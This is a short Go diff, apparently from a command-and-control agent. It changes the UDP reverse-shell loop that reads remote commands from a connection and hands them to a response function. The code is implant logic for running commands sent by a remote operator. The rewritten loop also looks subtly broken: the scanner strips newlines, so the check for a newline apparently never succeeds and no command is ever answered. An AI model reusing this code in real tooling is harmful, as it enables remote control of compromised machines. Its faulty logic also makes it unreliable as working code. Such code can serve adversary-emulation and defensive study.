@@ -27,11 +27,16 @@ func (contact UDP) Communicate(agent *util.AgentConfig, beacon util.Beacon) util
 
 			//reverse-shell
 			scanner := bufio.NewScanner(conn)
-			for scanner.Scan() && agent.Contact == "udp" {
-				message := strings.TrimSpace(scanner.Text())
-				udpRespond(conn, beacon, message, agent)
-				if agent.Contact != "udp" {
-					return beacon
+			var data string
+			for scanner.Scan() {
+				data += scanner.Text()
+				if strings.Contains(data, "\n") {
+					message := strings.TrimSpace(data)
+					udpRespond(conn, beacon, message, agent)
+					if agent.Contact != "udp" {
+						return beacon
+					}
+					data = ""
 				}
 			}
 	   	}
